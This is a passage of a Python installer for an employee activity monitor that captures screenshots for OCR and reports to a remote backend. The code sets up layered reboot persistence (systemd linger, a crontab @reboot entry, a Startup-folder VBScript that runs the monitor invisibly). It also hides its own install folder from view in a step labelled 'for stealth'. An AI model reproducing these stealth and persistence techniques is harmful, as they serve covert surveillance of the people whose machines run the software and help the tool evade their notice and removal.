        # ── Method 3: loginctl enable-linger ───────────────────────────────────
        # Without this, systemd user services stop when the user logs out.
        # Linger keeps them alive across reboots — critical for post-restart persistence.
        try:
            current_user = getpass.getuser()
            r = subprocess.run(['loginctl', 'enable-linger', current_user],
                               capture_output=True, check=False)
            if r.returncode == 0:
                print(f"[OK] Lingering enabled for {current_user} — service persists after every reboot")
            else:
                # Try with sudo
                r2 = subprocess.run(['sudo', 'loginctl', 'enable-linger', current_user],
                                    capture_output=True, check=False)
                if r2.returncode == 0:
                    print(f"[OK] Lingering enabled (sudo) for {current_user}")
                else:
                    print('[WARN] Could not enable lingering — service may not survive reboot without a desktop session')
        except Exception as e:
            print(f'[WARN] loginctl enable-linger failed: {e}')

        # ── Method 4: crontab @reboot fallback ─────────────────────────────────
        # Universal fallback that works on servers, minimal installs, and any Linux
        # distro regardless of init system or desktop environment.
        try:
            cron_line = f'@reboot {monitor_python} {monitor_path} >> {log_out} 2>> {log_err}'
            existing = subprocess.run(['crontab', '-l'], capture_output=True, text=True, check=False)
            existing_cron = existing.stdout if existing.returncode == 0 else ''
            clean_lines = [l for l in existing_cron.splitlines()
                           if 'monitor.py' not in l and 'employee-monitor' not in l]
            clean_lines.append(cron_line)
            new_cron = '\n'.join(clean_lines) + '\n'
            proc = subprocess.run(['crontab', '-'], input=new_cron, text=True,
                                  capture_output=True, check=False)
            if proc.returncode == 0:
                print('[OK] crontab @reboot entry added — monitor starts on every reboot')
        except Exception as e:
            print(f'[WARN] Could not set crontab @reboot: {e}')

        return service_ok or True

    print("[WARN] Auto-start is not configured for this platform.")
    return False

def protect_folder():
    print("\n[INFO] Applying folder hiding for stealth...")
    folder_path = os.path.abspath(os.path.dirname(__file__) or '.')

    if not is_windows():
        print("[INFO] Folder hiding is Windows-only; skipping on this platform.")
        return

    try:
        # Keep the folder hidden/system, but do not set deny-delete ACL.
        # Deny ACL slows down and can block complete remote uninstall.
        subprocess.run(['attrib', '+h', '+s', folder_path], capture_output=True, check=False)
        subprocess.run(['attrib', '+h', '+s', os.path.join(folder_path, '*'), '/s', '/d'], capture_output=True, check=False)
        
        print("[OK] Folder is hidden from standard view.")
        print("       (To reverse: run 'attrib -h -s .\\')")
    except Exception as e:
        print(f"[WARN] Could not apply folder protection: {e}")

def save_install_context():
    try:
        base = script_dir()
        data_dir = base / 'activity_data'
        data_dir.mkdir(parents=True, exist_ok=True)

        # Preserve existing install_id and backend_url if not provided via env.
        # This prevents a re-run from overwriting the ID and creating a duplicate user.
        existing_id = ''
        existing_backend = ''
        ctx_path = data_dir / 'install_context.json'
        if ctx_path.exists():
            try:
                with open(ctx_path, 'r', encoding='utf-8') as f:
                    old = json.load(f)
                existing_id = old.get('install_id', '').strip()
                existing_backend = old.get('backend_url', '').strip()
            except Exception:
                pass

        context = {
            'install_id': os.environ.get('INSTALL_ID', '').strip() or existing_id,
            'device_id': os.environ.get('DEVICE_ID', '').strip() or os.environ.get('COMPUTERNAME', '').strip() or os.environ.get('HOSTNAME', '').strip() or socket.gethostname(),
            'backend_url': os.environ.get('BACKEND_URL', '').strip() or existing_backend
        }

        with open(ctx_path, 'w', encoding='utf-8') as f:
            json.dump(context, f, indent=2)
        print('[OK] Saved install context for monitor identity resolution.')
    except Exception as e:
        print(f"[WARN] Could not save install context: {e}")


def is_already_installed():
    """Return (True, ctx_dict) if this machine already has a registered install_context."""
    ctx_path = script_dir() / 'activity_data' / 'install_context.json'
    if not ctx_path.exists():
        return False, {}
    try:
        with open(ctx_path, 'r', encoding='utf-8') as f:
            ctx = json.load(f)
        if ctx.get('install_id', '').strip():
            return True, ctx
    except Exception:
        pass
    return False, {}


def open_setup_page(backend_url, install_id='', device_id=''):
    """Open the web setup page in the default browser (new installs only)."""
    if not backend_url:
        return
    import urllib.parse
    params = []
    if install_id:
        params.append(f'install_id={urllib.parse.quote(str(install_id))}')
    if device_id:
        params.append(f'device_id={urllib.parse.quote(str(device_id))}')
    params.append('autoclose=1')
    url = f"{backend_url.rstrip('/')}/setup.html?{'&'.join(params)}"
    print(f"\n[INFO] Opening setup page — fill in your details to register this device.")
    print(f"       {url}")
    try:
        if is_windows():
            os.startfile(url)
        elif is_macos():
            subprocess.Popen(['open', url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            for browser_cmd in ('xdg-open', 'x-www-browser', 'gnome-open', 'sensible-browser'):
                if shutil.which(browser_cmd):
                    subprocess.Popen([browser_cmd, url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    break
            else:
                print(f"[WARN] No browser found. Open manually: {url}")
    except Exception as e:
        print(f"[WARN] Could not open browser: {e}. Open manually: {url}")

def main():
    # Always write output to setup_log.txt regardless of how Python was launched
    # (wscript.exe cannot redirect stdout, so we do it ourselves)
    try:
        log_path = script_dir() / 'setup_log.txt'
        _logf = open(str(log_path), 'a', encoding='utf-8', buffering=1)
        sys.stdout = _logf
        sys.stderr = _logf
    except Exception:
        pass

    import datetime
    print("\n" + "=" * 60)
    print(f"  INSTALL STARTED: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print("  EMPLOYEE ACTIVITY MONITOR - INSTALLER")
    print("=" * 60)

    # Check BEFORE cleanup so we can read the existing install_id from disk.
    already_installed, existing_ctx = is_already_installed()

    if already_installed:
        print(f"\n[OK] This machine is already registered.")
        print(f"     Install ID : {existing_ctx.get('install_id', 'unknown')}")
        print(f"     Device     : {existing_ctx.get('device_id', 'unknown')}")
        print(f"     Backend    : {existing_ctx.get('backend_url', 'unknown')}")
        print("\n[INFO] Updating packages only — no new user will be created.\n")
    else:
        cleanup_previous_package()
    
    _silent = '--silent' in sys.argv

    if not check_python():
        if is_windows() and '--no-install' not in sys.argv:
            install_python()
            print("\n[INFO] Please restart this script after Python installation.")
            if not _silent:
                input("Press Enter to exit...")
            sys.exit(0)

        if '--no-install' in sys.argv:
            print("\n[ERROR] Python is required. Please install from python.org")
            if not _silent:
                input("Press Enter to exit...")
            sys.exit(1)

        print("\n[ERROR] Python 3.8+ is required. Please install Python and rerun this installer.")
        sys.exit(1)

    install_requirements()

    tesseract_ok = check_tesseract()
    if not tesseract_ok:
        print("\n" + "=" * 60)
        print("  TESSERACT OCR — MANUAL INSTALLATION NEEDED")
        print("=" * 60)
        print("\n[WARN] Tesseract could not be installed automatically.")
        print("       The monitor will still start, but screenshot OCR will be")
        print("       disabled until you install Tesseract and restart the monitor.\n")
        print("INSTALL TESSERACT MANUALLY:\n")
        if is_windows():
            print("  Option 1 (Easiest) — Double-click the bundled installer:")
            print("    tesseract-ocr-w64-setup-5.5.0.20241111.exe")
            print()
            print("  Option 2 — winget (Windows 10/11 built-in):")
            print("    winget install UB-Mannheim.TesseractOCR")
            print()
            print("  Option 3 — Chocolatey:")
            print("    choco install tesseract")
            print()
            print("  Option 4 — Download directly:")
            print("    https://github.com/UB-Mannheim/tesseract/releases")
            print("    Run the .exe installer, accept defaults.")
        elif is_macos():
            print("  Option 1 — Homebrew (recommended):")
            print("    /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"")
            print("    brew install tesseract")
            print()
            print("  Option 2 — MacPorts:")
            print("    sudo port install tesseract")
            print()
            print("  Option 3 — conda:")
            print("    conda install -c conda-forge tesseract")
        else:
            print("  Ubuntu / Debian / Mint / Pop!_OS:")
            print("    sudo apt-get install -y tesseract-ocr")
            print()
            print("  Fedora / RHEL / Rocky / AlmaLinux:")
            print("    sudo dnf install -y tesseract")
            print()
            print("  Arch / Manjaro:")
            print("    sudo pacman -S tesseract")
            print()
            print("  openSUSE:")
            print("    sudo zypper install tesseract-ocr")
            print()
            print("  Alpine:")
            print("    sudo apk add tesseract-ocr")
            print()
            print("  conda:")
            print("    conda install -c conda-forge tesseract")
        print()
        print("  After installing, restart the monitor:")
        print("    python3 monitor.py")
        print()
        print("  The rest of the installation will now continue...\n")
    
    save_install_context()
    
    if '--autostart' in sys.argv or os.environ.get('SETUP_AUTOSTART'):
        setup_autostart()
    
    # Apply folder hiding and deletion lock
    protect_folder()
    
    print("\n" + "=" * 60)
    if tesseract_ok:
        print("  INSTALLATION COMPLETE!")
    else:
        print("  INSTALLATION COMPLETE  (Tesseract pending — see above)")
    print("=" * 60)
    print()
    if not tesseract_ok:
        print("[!] REMINDER: Install Tesseract manually to enable OCR.")
        print("    The monitor is running but will skip screenshot analysis until then.")
        print()
    
    if '--no-run' not in sys.argv:
        # For brand-new installs, open the setup page so the employee can register.
        # Re-runs skip this — same user is preserved, no duplicate created.
        if not already_installed and '--no-browser' not in sys.argv and os.environ.get('SKIP_SETUP_OPEN') != '1':
            ctx_path = script_dir() / 'activity_data' / 'install_context.json'
            backend_url = os.environ.get('BACKEND_URL', '').strip()
            install_id = ''
            device_id = socket.gethostname()
            if ctx_path.exists():
                try:
                    with open(ctx_path, 'r', encoding='utf-8') as f:
                        ctx = json.load(f)
                    install_id = ctx.get('install_id', '') or install_id
                    device_id = ctx.get('device_id', '') or device_id
                    backend_url = backend_url or ctx.get('backend_url', '')
                except Exception:
                    pass
            if not backend_url:
                url_file = script_dir() / 'backend_url.txt'
                if url_file.exists():
                    backend_url = url_file.read_text(encoding='utf-8').strip()
            if not backend_url:
                backend_url = 'https://eyeing.onrender.com'
            open_setup_page(backend_url, install_id, device_id)

        print("Starting monitor in the background...")
        print()

        os.chdir(str(script_dir()))

        if is_windows():
            startup_folder = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')

            if os.path.exists(vbs_path):
                try:
                    subprocess.Popen(['wscript.exe', vbs_path], shell=False)
                    print("[OK] Monitor has successfully started in the background!")
                    print("     It will continue running invisibly and restart automatically on PC boot.")
                except Exception as e:
                    print(f"[ERROR] Could not start hidden monitor: {e}")
            else:
                print("[WARN] VBScript not found. Running monitor directly (will attach to terminal)...")
                try:
                    subprocess.Popen([resolve_monitor_python_executable(prefer_windowless=True), 'monitor.py'])
                except Exception as e:
                    print(e)
        else:
            try:
                subprocess.Popen([resolve_monitor_python_executable(prefer_windowless=False), str(script_dir() / 'monitor.py')], cwd=str(script_dir()), start_new_session=True)
                print("[OK] Monitor has successfully started in the background!")
            except Exception as e:
                print(f"[ERROR] Could not start monitor: {e}")

if __name__ == '__main__':
    main()
